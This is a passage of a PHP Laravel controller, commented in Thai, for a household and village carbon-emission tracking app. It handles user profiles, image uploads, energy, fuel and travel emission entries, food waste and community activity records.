            DB::table('user')
                ->where('User_Code', $userCode)
                ->update([
                    'User_Name' => $request->input('User_Name'),
                    'email' => $request->input('email'),
                    'tel' => $request->input('tel'),
                ]);
        } catch (\Exception $e) {
            return response()->json([
                'status' => 500,
                'message' => 'Update failed: ' . $e->getMessage(),
            ], 500);
        }

        // 4) ตอบกลับสำเร็จ
        return response()->json([
            'status' => 200,
            'message' => 'Account updated successfully',
        ], 200);
    }
    public function uploadProfileImage(Request $request, $userCode)
    {
        // ตรวจสอบว่ามีผู้ใช้หรือไม่
        $exists = DB::table('user')->where('User_Code', $userCode)->exists();
        if (!$exists) {
            return response()->json([
                'status' => 404,
                'message' => 'ไม่พบผู้ใช้ที่ระบุ',
            ], 404);
        }

        // ตรวจสอบไฟล์ภาพ
        $validator = Validator::make($request->all(), [
            'img' => 'nullable|image|mimes:jpeg,png,jpg,webp|max:5120',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'status' => 422,
                'message' => 'รูปภาพไม่ถูกต้อง',
                'errors' => $validator->errors(),
            ], 422);
        }

        $disk = Storage::disk('public');

        // สร้างโฟลเดอร์ Users ถ้ายังไม่มี
        if (!$disk->exists('Users')) {
            $disk->makeDirectory('Users');
        }

        // ดึงชื่อไฟล์เก่า (ไม่ใช่ URL เต็ม)
        $oldFileName = DB::table('user')
            ->where('User_Code', $userCode)
            ->value('img');

        if ($oldFileName && str_contains($oldFileName, '/')) {
            $oldFileName = basename($oldFileName); // ดึงเฉพาะชื่อไฟล์
        }

        $newFileName = $oldFileName;

        // ถ้ามีการอัปโหลดใหม่
        if ($request->hasFile('img')) {
            // ลบไฟล์เก่า
            if ($oldFileName && $disk->exists("Users/{$oldFileName}")) {
                $disk->delete("Users/{$oldFileName}");
            }

            $file = $request->file('img');
            $ext = $file->getClientOriginalExtension();
            $newFileName = "{$userCode}." . strtolower($ext);
            $file->storeAs('Users', $newFileName, 'public');
        }

        // อัปเดตชื่อไฟล์ในฐานข้อมูล
        $publicPath = "{$newFileName}";

        DB::table('user')
            ->where('User_Code', $userCode)
            ->update([
                'img' => $publicPath,
            ]);

        return response()->json([
            'status' => 200,
            'message' => 'อัปโหลดรูปโปรไฟล์สำเร็จ',
            'img' => url($publicPath),
        ], 200);

    }

    public function exitHome(Request $request): JsonResponse
    {
        // 1) Validate incoming payload
        $validator = Validator::make($request->all(), [
            'User_Code' => 'required|integer|exists:user,User_Code',
            'home_Code' => 'required|integer|exists:home,home_Code',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'status' => 422,
                'message' => 'Validation error',
                'errors' => $validator->errors(),
            ], 422);
        }
        $data = $validator->validated();



        // 2) ตรวจว่าผู้ใช้มีอยู่จริงหรือไม่


        // 3) อัปเดตข้อมูล
        try {
            DB::table('user')
                ->where('User_Code', $data['User_Code'])
                ->update([
                    'home_Code' => 0
                ]);
            DB::table('home')
                ->where('home_Code', $data['home_Code'])
                ->decrement('Member_number');

        } catch (\Exception $e) {
            return response()->json([
                'status' => 500,
                'message' => 'Update failed: ' . $e->getMessage(),
            ], 500);
        }

        // 4) ตอบกลับสำเร็จ
        return response()->json([
            'status' => 200,
            'message' => 'Account updated successfully',
        ], 200);
    }


    public function sentReport(Request $request)
    {
        // Validate input
        $validator = Validator::make($request->all(), [
            'user_code' => 'required|integer|exists:user,User_Code',
            'topic' => 'required|in:1,2,3,4',
            'detail' => 'required|string|max:1000',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'status' => false,
                'errors' => $validator->errors()
            ], 422);
        }

        $data = $validator->validated();

        // 2) Compute new Item_Code (ถ้าตารางไม่ใช้ auto-increment)
        $maxCode = DB::table('report')->max('report_code') ?? 0;
        $newCode = $maxCode + 1;

        // Save report
        DB::table('report')->insert([
            'report_code' => $newCode,
            'report_detail' => $data['detail'],
            // 'watt' => $data['watt'],
            'type' => $data['topic'],
            'reading' => 0,
            'User_Code' => $data['user_code'],
        ]);

        return response()->json([
            'status' => true,
            'message' => 'Report submitted successfully',
            'data' => $newCode
        ]);
    }
    public function getHomeMembers($homeCode): JsonResponse
    {
        // 1) JOIN user, village, home แล้วดึงฟิลด์ที่ต้องการ
        $members = DB::table('user')
            ->join('village', 'user.Village_Code', '=', 'village.Village_Code')
            ->join('home', 'user.Home_Code', '=', 'home.Home_Code')
            ->where('user.Home_Code', $homeCode)
            ->select([
                'user.User_Code',
                'user.User_Name',
                'user.email',
                'user.tel',
                'user.status',
                'user.img       as user_img',
                'village.Village_Name',
                'home.Home_number',
                'home.img       as home_img',
            ])
            ->get();

        // 2) ถ้าไม่มีสมาชิก คืน 204 No Content
        if ($members->isEmpty()) {
            return response()->json([], 204);
        }

        // 3) ต่อ URL ให้ภาพ user_img และ home_img
        $members = $members->map(function ($item) {
            if (!empty($item->user_img)) {
                $item->user_img = url("storage/app/public/users/{$item->user_img}");
            }
            if (!empty($item->home_img)) {
                $item->home_img = url("storage/app/public/homes/{$item->home_img}");
            }
            return $item;
        });

        // 4) คืน JSON พร้อม 200 OK
        return response()->json($members, 200);
    }

    public function getVehicle($homeCode): JsonResponse
    {
        // ดึงข้อมูลทั้งหมด
        $items = DB::table('item')
            ->join('fuel', 'item.fuel_Code', '=', 'fuel.fuel_Code')
            ->where('item.home_Code', $homeCode)
            ->where('fuel.type', 'V')
            ->where('item.is_delete', 0)
            ->whereNotNull('item.fuel_Code')        // <-- เพิ่มตรงนี้
            ->select([
                'item.item_Code',
                'item.location_name',
                'fuel.fuel_Name',
                'fuel.img',
                'item.size',
                'item.type',
            ])
            ->get();

        // 2) map ให้ img กลายเป็น URL เต็ม (ถ้ามี)
        $items = $items->map(function ($item) {
            if (!empty($item->img)) {
                // ต้องรัน php artisan storage:link แล้ว
                $item->img = url("storage/app/public/Fuels/{$item->img}");
            }
            return $item;
        });

        // 3) สถานะ 204 ถ้าไม่มีข้อมูล, 200 ถ้ามี
        $statusCode = $items->isEmpty() ? 204 : 200;

        // 4) คืน JSON
        return response()->json($items, $statusCode);
    }
    public function getHomeFoodFuel($homeCode): JsonResponse
    {
        // ดึงข้อมูลทั้งหมด
        $items = DB::table('item')
            ->join('fuel', 'item.fuel_Code', '=', 'fuel.fuel_Code')
            ->where('item.home_Code', $homeCode)
            ->where('fuel.type', 'F')
            ->where('item.is_delete', 0)
            ->whereNotNull('item.fuel_Code')        // <-- เพิ่มตรงนี้
            ->select([
                'item.item_Code',
                'item.size',
                'item.location_name',
                'fuel.fuel_Name',
                'fuel.img',
            ])
            ->get();

        // 2) map ให้ img กลายเป็น URL เต็ม (ถ้ามี)
        $items = $items->map(function ($item) {
            if (!empty($item->img)) {
                // ต้องรัน php artisan storage:link แล้ว
                $item->img = url("storage/app/public/Fuels/{$item->img}");
            }
            return $item;
        });

        // 3) สถานะ 204 ถ้าไม่มีข้อมูล, 200 ถ้ามี
        $statusCode = $items->isEmpty() ? 204 : 200;

        // 4) คืน JSON
        return response()->json($items, $statusCode);
    }

    public function dailyReduce(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'User_Code' => 'required|integer|exists:user,User_Code',
        ]);
        if ($validator->fails()) {
            return response()->json([
                'status' => 422,
                'message' => 'Invalid payload',
                'errors' => $validator->errors(),
            ], 422);
        }

        $data = $validator->validated();

        $rec = DB::table('joiner')
            ->join('activity', 'joiner.activity_Code', '=', 'activity.activity_Code')
            ->where('joiner.User_Code', $data['User_Code'])
            ->where('joiner.status', 1)
            ->where('activity.status', 1)
            ->select(['activity.activity_Name', 'activity.type', 'activity.tree_detail', 'unit.Ndivide', 'unit.Idivide'])
            ->get();

        if (!$rec) {
            return response()->json(['status' => 404, 'message' => 'Item not found'], 404);
        }

    }

    public function checkMonthly(Request $request): JsonResponse
    {
        $validator = Validator::make($request->all(), [
            'home_Code' => 'required|integer|exists:home,home_Code',
            'year' => 'nullable|integer|min:2000|max:2100',
            'month' => 'nullable|integer|between:1,12',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'status' => 422,
                'message' => 'Invalid payload',
                'errors' => $validator->errors(),
            ], 422);
        }

        $homeCode = (int) $request->input('home_Code');
        $year = (int) ($request->input('year') ?? now()->year);
        $month = (int) ($request->input('month') ?? now()->month);

        // ผู้ใช้ทั้งหมดในบ้านนี้
        $userIds = DB::table('user')
            ->where('home_Code', $homeCode)
            ->pluck('User_Code');

        if ($userIds->isEmpty()) {
            // ไม่มีสมาชิกในบ้าน -> คืนลิสต์ว่าง
            return response()->json([], 200);
        }

        // ช่วงวันของเดือนที่ต้องการ
        $start = Carbon::create($year, $month, 1)->startOfDay();
        $end = (clone $start)->endOfMonth()->endOfDay();

        // หารายการที่บันทึกแบบ monthly (input_type = 'm') ในเดือนนั้น
        $rows = DB::table('usings')
            ->whereIn('User_Code', $userIds)
            ->where('input_type', 'm')
            ->whereBetween('Date_time', [$start, $end])
            ->orderBy('Date_time', 'desc')
            ->select([
                'User_Code',
                'Home_item_Code',
                'Date_time',
                'Distance_time',   // kWh ที่บันทึก
                'CO2_emission',
                'N2O_emission',
                'CH4_emission',
            ])
            ->get();

        // เพื่อให้ฝั่ง Flutter ใช้ List<Map<String,dynamic>>.from(data) ได้ตรง ๆ
        return response()->json($rows, 200);
    }

    public function addMonthlyEnergy(Request $request): JsonResponse
    {
        $validator = Validator::make($request->all(), [
            'User_Code' => 'required|integer|exists:user,User_Code',
            'kwh' => 'required|numeric|min:0.01',
            'mode' => 'nullable|string|in:create,update',
            'month' => 'nullable|integer|min:1|max:12',
            'year' => 'nullable|integer|min:2000|max:2100',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'status' => 422,
                'message' => 'Invalid payload',
                'errors' => $validator->errors(),
            ], 422);
        }

        $data = $validator->validated();
        $mode = $data['mode'] ?? 'create';
        $kwh = (float) $data['kwh'];
        $month = (int) ($data['month'] ?? now()->month);
        $year = (int) ($data['year'] ?? now()->year);

        // ดึง emission factors
        $factors = DB::table('setup_co2')
            ->whereIn('setup_name', ['CO2', 'N2O', 'CH4'])
            ->pluck('value', 'setup_name');

        if (!isset($factors['CO2'], $factors['N2O'], $factors['CH4'])) {
            return response()->json([
                'status' => 500,
                'message' => 'Emission factors missing',
            ], 500);
        }

        // คำนวณ emission
        $CO2emission = $kwh * (float) $factors['CO2'];
        $N2Oemission = $kwh * (float) $factors['N2O'];
        $Ch4emission = $kwh * (float) $factors['CH4'];

        // หาเรคคอร์ดในเดือน/ปีเดียวกันของ user (input_type=m และ Home_item_Code=99)
        $startOfMonth = Carbon::create($year, $month, 1, 0, 0, 0)->startOfDay();
        $endOfMonth = (clone $startOfMonth)->endOfMonth();

        $existing = DB::table('usings')
            ->where('User_Code', (int) $data['User_Code'])
            ->where('Home_item_Code', 99)
            ->where('input_type', 'm')
            ->whereBetween('Date_time', [$startOfMonth, $endOfMonth])
            ->first();

        try {
            if ($mode === 'update') {
                // ต้องมีรายการเดิมให้แก้ไข
                if (!$existing) {
                    return response()->json([
                        'status' => 404,
                        'message' => 'Monthly record not found for update',
                    ], 404);
                }
                $startOfMonth = Carbon::create($year, $month, 1, 0, 0, 0);
                $endOfMonth = (clone $startOfMonth)->endOfMonth();
                $day = min(30, (int) $endOfMonth->day);       // ถ้าเดือนไม่มี 30 ให้ใช้วันสุดท้าย
                $anchor = Carbon::create($year, $month, $day, 0, 0, 0);

                DB::table('usings')
                    ->where('User_Code', (int) $data['User_Code'])
                    ->where('Home_item_Code', 99)
                    ->where('input_type', 'm')
                    ->whereDate('Date_time', $anchor->toDateString())
                    ->update([
                        'Distance_time' => $kwh,
                        'CO2_emission' => $CO2emission,
                        'N2O_emission' => $N2Oemission,
                        'CH4_emission' => $Ch4emission,
                    ]);

                return response()->json([
                    'status' => 200,
                    'message' => 'Updated',
                    'kwh' => $kwh,
                    'CO2_emission' => round($CO2emission, 4),
                    'N2O_emission' => round($N2Oemission, 4),
                    'CH4_emission' => round($Ch4emission, 4),
                    'month' => $month,
                    'year' => $year,
                ], 200);
            }

            // mode = create
            if ($existing) {
                return response()->json([
                    'status' => 409,
                    'message' => 'Monthly record already exists. Use mode=update to modify.',
                ], 409);
            }

            // ตั้ง Date_time = วันที่ 30 ของเดือนนั้น ถ้าเดือนไม่มี 30 วัน ให้ใช้วันสุดท้ายของเดือนแทน
            $targetDay = min(30, (int) $endOfMonth->day);
            $targetDate = Carbon::create($year, $month, $targetDay, 0, 0, 0);

            DB::table('usings')->insert([
                'User_Code' => (int) $data['User_Code'],
                'Home_item_Code' => 99,           // ไอเท็มพิเศษ "ค่ารายเดือน"
                'Date_time' => $targetDate,  // วันที 30 (หรือวันสุดท้ายหาก <30)
                'Distance_time' => $kwh,         // เก็บค่า kWh
                'CO2_emission' => $CO2emission,
                'N2O_emission' => $N2Oemission,
                'CH4_emission' => $Ch4emission,
                'input_type' => 'm',          // ต้นทางข้อมูล monthly
            ]);

            return response()->json([
                'status' => 200,
                'message' => 'Saved',
                'kwh' => $kwh,
                'CO2_emission' => round($CO2emission, 4),
                'N2O_emission' => round($N2Oemission, 4),
                'CH4_emission' => round($Ch4emission, 4),
                'date_time' => $targetDate->toDateTimeString(),
                'month' => $month,
                'year' => $year,
            ], 200);

        } catch (\Throwable $e) {
            return response()->json([
                'status' => 500,
                'message' => 'Database operation failed',
                'error' => $e->getMessage(),
            ], 500);
        }
    }


    public function addEmission(Request $request): JsonResponse
    {
        // 1) Validate ตามสาขา E/F/V
        $validator = Validator::make($request->all(), [
            'User_Code' => 'required|integer|exists:user,User_Code',
            'item' => 'required|integer|exists:item,item_Code',
            'date' => 'sometimes|date_format:Y-m-d',

            'useType' => ['required', 'string', Rule::in(['E', 'F', 'V'])],

            // E/F ต้องมี start/end, V ไม่ต้อง
            'start_time' => 'required_unless:useType,V|date_format:H:i',
            'end_time' => 'required_unless:useType,V|date_format:H:i|after:start_time',

            // เผื่อ compat (ถ้าส่ง hour มาเองได้), ไม่บังคับ
            'hour' => 'nullable|numeric|min:0.01',

            // V ต้องส่งระยะทาง
            'distance' => 'required_if:useType,V|numeric|min:0.01',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'status' => 422,
                'message' => 'Invalid payload',
                'errors' => $validator->errors(),
            ], 422);
        }

        $data = $validator->validated();

        // 2) คำนวณชั่วโมงจาก start/end (ถ้าไม่ได้ส่ง hour มา) และรองรับข้ามวัน
        $hours = null;           // ชั่วโมงใช้งาน (E/F)
        $usedTimeForStamp = '00:00'; // เวลาไว้ประกอบ Date_time

        if ($data['useType'] !== 'V') {
            $start = Carbon::createFromFormat('H:i', $data['start_time']);
            $end = Carbon::createFromFormat('H:i', $data['end_time']);
            if ($end->lessThanOrEqualTo($start)) {
                // ข้ามเที่ยงคืน
                $end->addDay();
            }
            $hours = $data['hour'] ?? round($start->floatDiffInMinutes($end) / 60, 2);
            $usedTimeForStamp = $data['start_time']; // เก็บเป็นเวลาเริ่ม
        }

        // 3) ดึงแฟคเตอร์/ข้อมูล item ตามประเภท
        $CO2emission = 0;
        $N2Oemission = 0;
        $Ch4emission = 0;

        if ($data['useType'] === 'E') {
            $rec = DB::table('item')
                ->join('item_type', 'item.Item_type_Code', '=', 'item_type.Item_type_Code')
                ->join('unit', 'item_type.Unit_Code', '=', 'unit.Unit_Code')
                ->where('item.item_Code', $data['item'])
                ->select(['item.item_Code', 'item.size', 'item.type', 'unit.Ndivide', 'unit.Idivide'])
                ->first();

            if (!$rec) {
                return response()->json(['status' => 404, 'message' => 'Item not found'], 404);
            }

            $kWh = 0;
            if ($rec->type === 'N')
                $kWh = $hours * ($rec->size / $rec->Ndivide);
            elseif ($rec->type === 'I')
                $kWh = $hours * ($rec->size / $rec->Idivide);
            else
                return response()->json(['status' => 400, 'message' => 'Invalid item type'], 400);

            $factors = DB::table('setup_co2')
                ->whereIn('setup_name', ['CO2', 'N2O', 'CH4'])
                ->pluck('value', 'setup_name');

            if (!isset($factors['CO2'], $factors['N2O'], $factors['CH4'])) {
                return response()->json(['status' => 500, 'message' => 'Emission factors missing'], 500);
            }

            $CO2emission = $kWh * $factors['CO2'];
            $N2Oemission = $kWh * $factors['N2O'];
            $Ch4emission = $kWh * $factors['CH4'];
        } elseif ($data['useType'] === 'F') {
            // เชื้อเพลิงทำอาหาร – คิดตามชั่วโมง
            $rec = DB::table('item')
                ->join('fuel', 'item.fuel_Code', '=', 'fuel.fuel_Code')
                ->where('item.item_Code', $data['item'])
                ->select(['fuel.Co2_emission', 'fuel.Ch4_emission', 'fuel.N2o_emission', 'fuel.Distance_time', 'item.size'])
                ->first();

            if (!$rec) {
                return response()->json(['status' => 404, 'message' => 'Fuel not found'], 404);
            }

            // เดิมใช้ hour * Distance_time เป็นฐาน
            $base = $hours * $rec->Distance_time;
            $CO2emission = $base * $rec->Co2_emission;
            $N2Oemission = $base * $rec->N2o_emission;
            $Ch4emission = $base * $rec->Ch4_emission;
        } else { // V – การเดินทาง ใช้ระยะทาง
            $rec = DB::table('item')
                ->join('fuel', 'item.fuel_Code', '=', 'fuel.fuel_Code')
                ->where('item.item_Code', $data['item'])
                ->select([
                    'fuel.Co2_emission',  // ปริมาณ CO2 ต่อ "ลิตร" เชื้อเพลิง (สมมุติ)
                    'fuel.Ch4_emission',
                    'fuel.N2o_emission',
                    'item.size',
                ])
                ->first();

            if (!$rec) {
                return response()->json(['status' => 404, 'message' => 'Fuel not found or item has no fuel_Code'], 404);
            }

            $kmPerLitre = (float) $rec->size;
            if ($kmPerLitre <= 0) {
                return response()->json(['status' => 422, 'message' => 'km_per_litre must be > 0'], 422);
            }

            $distance = (float) $data['distance']; // กม.
            $litres = $distance / $kmPerLitre;     // ลิตรที่ใช้จริง

            $CO2emission = $litres * (float) $rec->Co2_emission;
            $N2Oemission = $litres * (float) $rec->N2o_emission;
            $Ch4emission = $litres * (float) $rec->Ch4_emission;

            $hours = null;              // สำหรับเก็บใน Distance_time ของ V จะใช้เป็น "ระยะทาง"
            $usedTimeForStamp = '00:00';
        }

        // 4) Insert
        $usedDate = $data['date'] ?? now()->toDateString();
        $usedAt = $usedDate . ' ' . ($usedTimeForStamp ?? '00:00') . ':00';

        DB::table('usings')->insert([
            'User_Code' => $data['User_Code'],
            'Home_item_Code' => $data['item'],
            'Date_time' => $usedAt,
            'Distance_time' => $data['useType'] === 'V' ? (float) $data['distance'] : (float) $hours,
            'CO2_emission' => $CO2emission,
            'N2O_emission' => $N2Oemission,
            'CH4_emission' => $Ch4emission,
            'input_type' => 'd',
        ]);


        return response()->json([
            'status' => 200,
            'message' => 'Emission data added successfully',
            'CO2_emission' => $CO2emission,
            'N2O_emission' => $N2Oemission,
            'CH4_emission' => $Ch4emission,
        ], 200);
    }

    public function calculateAndInsertDailyUsingNoCron(Request $request): JsonResponse
    {
        $forDate = $request->input('forDate');
        $date = $forDate ?: now('Asia/Bangkok')->toDateString();
        $dateTime = $date . ' 00:10:00';

        DB::beginTransaction();
        try {
            $factors = DB::table('setup_co2')
                ->whereIn('setup_name', ['CO2', 'N2O', 'CH4'])
                ->pluck('value', 'setup_name');

            if (!isset($factors['CO2'], $factors['N2O'], $factors['CH4'])) {
                return response()->json(['status' => false, 'message' => 'Emission factors missing'], 500);
            }

            $items = DB::table('item')
                ->join('item_type', 'item.Item_type_Code', '=', 'item_type.Item_type_Code')
                ->join('unit', 'item_type.Unit_Code', '=', 'unit.Unit_Code')
                ->where('item.Use_status', 1)
                ->select([
                    'item.Item_Code',
                    'item.home_Code',
                    'item.size',
                    'item.type',       // 'N' | 'I'
                    'unit.Ndivide',
                    'unit.Idivide',
                    // 'item.hours_per_day', // ถ้ามีคอลัมน์นี้จะดีมาก
                ])
                ->get();

            $inserted = 0;

            foreach ($items as $it) {

                // 1) หา user ของบ้านนั้น (พยายามเลือกหัวหน้าบ้าน status=0 ก่อน)
                $userCode = DB::table('user')
                    ->where('home_Code', $it->home_Code)
                    ->orderByRaw("CASE WHEN status = 0 THEN 0 ELSE 1 END")
                    ->value('User_Code');

                if (!$userCode) {
                    \Log::info('skip: no user in home', ['home' => $it->home_Code, 'item' => $it->Item_Code]);
                    continue; // ไม่มีสมาชิกในบ้านนี้ ข้าม
                }

                // 2) คำนวณชั่วโมง/พลังงาน
                $hours = 24.0; // หรือดึงจากฟิลด์อื่นถ้ามี
                $kWh = 0.0;
                if ($it->type === 'N') {
                    if ((float) $it->Ndivide <= 0) {
                        \Log::info('skip: Ndivide<=0', ['item' => $it->Item_Code]);
                        continue;
                    }
                    $kWh = $hours * ((float) $it->size / (float) $it->Ndivide);
                } elseif ($it->type === 'I') {
                    if ((float) $it->Idivide <= 0) {
                        \Log::info('skip: Idivide<=0', ['item' => $it->Item_Code]);
                        continue;
                    }
                    $kWh = $hours * ((float) $it->size / (float) $it->Idivide);
                } else {
                    \Log::info('skip: type not N/I', ['item' => $it->Item_Code, 'type' => $it->type]);
                    continue;
                }

                $CO2 = $kWh * (float) $factors['CO2'];
                $N2O = $kWh * (float) $factors['N2O'];
                $CH4 = $kWh * (float) $factors['CH4'];

                DB::table('usings')->updateOrInsert(
                    [
                        'User_Code' => $userCode,
                        'Home_item_Code' => $it->Item_Code,
                        'Date_time' => $dateTime,
                    ],
                    [
                        'Distance_time' => $hours,
                        'CO2_emission' => $CO2,
                        'N2O_emission' => $N2O,
                        'CH4_emission' => $CH4,
                        'input_type' => 'd',
                    ]
                );

                $inserted++;
            }


            $t = DB::table('item')
                ->join('item_type', 'item.Item_type_Code', '=', 'item_type.Item_type_Code')
                ->join('unit', 'item_type.Unit_Code', '=', 'unit.Unit_Code')
                ->where('item.item_Code', 2)
                ->select('item.item_Code', 'item.home_Code', 'item.type', 'item.size', 'unit.Ndivide', 'unit.Idivide')
                ->first();



            DB::commit();
            return response()->json([
                'status' => true,
                'message' => 'คำนวณและบันทึกการใช้งานรายวันสำเร็จ',
                'date' => $date,
                'count' => $inserted,
                'check' => $t,
            ], 200);
        } catch (\Throwable $e) {
            DB::rollBack();
            return response()->json([
                'status' => false,
                'message' => 'ผิดพลาดระหว่างคำนวณ/บันทึก',
                'error' => $e->getMessage(),
            ], 500);
        }
    }




    public function addFoodWaste(Request $request)
    {
        $validated = Validator::make($request->all(), [
            'User_Code' => 'required|integer|exists:user,User_Code',
            'weight' => 'required|numeric|min:0.01',
        ]);

        if ($validated->fails()) {
            return response()->json(['message' => 'ข้อมูลไม่ถูกต้อง'], 422);
        }

        $weight = $request->weight;

        // ✅ คำนวณค่าการปล่อยก๊าซ
        $CO2emission = $weight * 1.79;
        $N2Oemission = $weight * 0.0002;
        $CH4emission = $weight * 0.062;

        DB::table('usings')->insert([
            'User_Code' => $request->User_Code,
            'Home_item_Code' => 0, // 0 สำหรับเศษอาหาร
            'CO2_emission' => $CO2emission,
            'N2O_emission' => $N2Oemission,
            'CH4_emission' => $CH4emission,
            'Distance_time' => $weight,
            'Date_time' => now(),
            'input_type' => 'd',
        ]);

        return response()->json([
            'status' => 200,
            'message' => 'Emission data added successfully',
            'CO2_emission' => $CO2emission,
            'N2O_emission' => $N2Oemission,
            'CH4_emission' => $CH4emission,
        ], 200);
    }



    public function mainLeader(Request $request): \Illuminate\Http\JsonResponse
    {
        $data = $request->validate([
            'User_Code' => 'required|integer|exists:user,User_Code',
        ]);

        $leader = DB::table('user')
            ->join('village', 'user.Village_Code', '=', 'village.Village_Code')
            ->where('user.User_Code', $data['User_Code'])
            ->select([
                'user.User_Code',
                'user.User_Name',
                'user.email',
                'user.tel',
                'user.status',
                'user.img as user_img',
                'village.Village_Code',
                'village.Village_Name',
            ])
            ->first();

        if (!$leader) {
            return response()->json(['status' => 404, 'message' => 'Leader not found'], 404);
        }

        // รวม CO₂ ต่อบ้าน (เฉพาะ input_type = 'd')
        $usingsAgg = DB::table('user as u')
            ->leftJoin('usings as s', function ($j) {
                $j->on('s.User_Code', '=', 'u.User_Code')
                    ->where('s.input_type', '=', 'd');
            })
            ->select('u.home_Code', DB::raw('COALESCE(SUM(s.CO2_emission),0) as total_co2'))
            ->groupBy('u.home_Code');

        // รวม CO₂ ทั้งชุมชนโดย sum จาก aggregation ต่อบ้าน
        $allCO2 = DB::table('home as h')
            ->where('h.Village_Code', $leader->Village_Code)
            ->leftJoinSub($usingsAgg, 'ua', 'ua.home_Code', '=', 'h.Home_Code')
            ->sum(DB::raw('COALESCE(ua.total_co2,0)'));

        if (!empty($leader->user_img)) {
            $leader->user_img = url("storage/app/public/Users/{$leader->user_img}");
        }

        $leaderArr = (array) $leader;
        $leaderArr['all_co2'] = (float) $allCO2;

        return response()->json(['status' => 200, 'data' => $leaderArr], 200);
    }



    public function getVillageMember(Request $request): \Illuminate\Http\JsonResponse
    {
        $data = $request->validate([
            'Village_Code' => 'required|integer|exists:village,Village_Code',
        ]);
        $villageCode = (int) $data['Village_Code'];

        // (1) รวม CO₂ ต่อบ้าน (เฉพาะ input_type = 'd')
        $usingsAgg = DB::table('user as u')
            ->leftJoin('usings as s', function ($j) {
                $j->on('s.User_Code', '=', 'u.User_Code')
                    ->where('s.input_type', '=', 'd');
            })
            ->select('u.home_Code', DB::raw('COALESCE(SUM(s.CO2_emission),0) as total_co2'))
            ->groupBy('u.home_Code');

        // (2) สถานะได้รับรางวัลต่อบ้าน (มี >=1 รายการ = 1)
        $rewardAgg = DB::table('rewarded')
            ->select('home_Code', DB::raw('1 as rewarded'))
            ->groupBy('home_Code');

        // (3) ชื่อ/รูปผู้ใช้งานในบ้าน (เลือก min เพื่อแทน “คนแรก”)
        $userInfo = DB::table('user')
            ->select(
                'home_Code',
                DB::raw('COALESCE(MIN(User_Name), "") as name'),
                DB::raw('COALESCE(MIN(img), "") as user_img')
            )
            ->groupBy('home_Code');

        // (4) บ้านทั้งหมด + join ซับที่สรุปไว้
        $members = DB::table('home as h')
            ->where('h.Village_Code', $villageCode)
            ->leftJoinSub($usingsAgg, 'ua', 'ua.home_Code', '=', 'h.Home_Code')
            ->leftJoinSub($rewardAgg, 'rw', 'rw.home_Code', '=', 'h.Home_Code')
            ->leftJoinSub($userInfo, 'ui', 'ui.home_Code', '=', 'h.Home_Code')
            ->select([
                'h.Home_Code',
                'h.Home_number as number',
                'h.img as home_img',
                DB::raw('COALESCE(ui.name,"") as name'),
                DB::raw('COALESCE(ua.total_co2,0) as total_co2'),
                DB::raw('COALESCE(rw.rewarded,0) as rewarded'),
                DB::raw('COALESCE(ui.user_img,"") as user_img'),
            ])
            ->orderBy('h.Home_number')
            ->get();

        // ต่อ URL รูป
        $members = $members->map(function ($item) {
            if (!empty($item->user_img)) {
                $item->user_img = url("storage/app/public/users/{$item->user_img}");
            }
            if (!empty($item->home_img)) {
                $item->home_img = url("storage/app/public/homes/{$item->home_img}");
            }
            return $item;
        });

        return response()->json(['status' => 200, 'data' => $members], 200);
    }



    public function TreeList(): JsonResponse
    {
        // ดึงข้อมูลทั้งหมด
        $tree = Tree::all();
        $statusCode = $tree->isEmpty() ? 204 : 200;

        return response()->json($tree, $statusCode);
    }

    public function createActivity(Request $request): JsonResponse
    {
        // 1) Validate incoming payload
        $validator = Validator::make($request->all(), [
            'user_code' => 'required|integer|exists:user,User_Code',
            'village_code' => 'required|integer|exists:village,Village_Code',
            'activity_name' => 'required|string|max:255',
            'activity_type' => 'required|string|max:50',
            'detail' => 'nullable|string',
            'want_count' => 'required|integer|min:0',
            'activity_date' => 'required|date_format:Y-m-d',
            'start_time' => 'nullable|date_format:H:i',
            'end_time' => 'nullable|date_format:H:i|after_or_equal:start_time',
            'trash_weight' => 'nullable|numeric',
            'tree_details' => 'nullable|array',
            'tree_details.*.tree_code' => 'nullable|integer|exists:tree,tree_Code',
            'tree_details.*.count' => 'nullable|integer|min:0',
            'tree_details.*.dead_count' => 'nullable|integer|min:0',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'status' => 422,
                'message' => 'Validation error',
                'errors' => $validator->errors(),
            ], 422);
        }

        $data = $validator->validated();

        // 2) Compute new activity_Code
        $maxCode = DB::table('activity')->max('activity_Code') ?? 0;
        $newActivityCode = $maxCode + 1;

        $treeDetails = collect($data['tree_details'] ?? [])
            ->map(function ($row) {
                return [
                    'tree_code' => isset($row['tree_code']) ? (int) $row['tree_code'] : null,
                    'count' => isset($row['count']) ? (int) $row['count'] : 0,
                    'dead_count' => isset($row['dead_count']) ? (int) $row['dead_count'] : 0, // default 0
                ];
            })
            // ตัดแถวที่ไม่มี tree_code ออก ป้องกันขยะ
            ->filter(fn($r) => !is_null($r['tree_code']) && $r['tree_code'] > 0)
            ->values()
            ->all();

        $treeJson = json_encode($treeDetails, JSON_UNESCAPED_UNICODE);

        // 4) Insert into activity
        try {
            DB::table('activity')->insert([
                'activity_Code' => $newActivityCode,
                'activity_Name' => $data['activity_name'],
                'Activity_detail' => $data['detail'],
                'Count' => $data['want_count'],
                'Date' => $data['activity_date'],
                'Start' => $data['start_time'],
                'end' => $data['end_time'],
                'type' => $data['activity_type'],
                'User_Code' => $data['user_code'],
                'Village_Code' => $data['village_code'],
                'tree_detail' => $treeJson,
                'trash_weight' => $data['trash_weight'] ?? null,
                'status' => 0,
            ]);
        } catch (\Exception $e) {
            return response()->json([
                'status' => 500,
                'message' => 'Insert activity failed: ' . $e->getMessage(),
            ], 500);
        }

        // 5) Fetch all users in that village to notify
        $userCodes = DB::table('user')
            ->where('Village_Code', $data['village_code'])
            ->pluck('User_Code')
            ->toArray();

        // 6) Build notification entries
        $notifications = [];
        foreach ($userCodes as $uc) {
            $notifications[] = [
                'User_Code' => $uc,
                'activity_Code' => $newActivityCode,
                'reading' => 0,
                'join_status' => 0,
            ];
        }

        // 7) Insert into notification table
        try {
            DB::table('notification')->insert($notifications);
        } catch (\Exception $e) {
            // ถ้าล้มเหลว กรณีนี้เรายังถือว่า activity สร้างสำเร็จ
            return response()->json([
                'status' => 500,
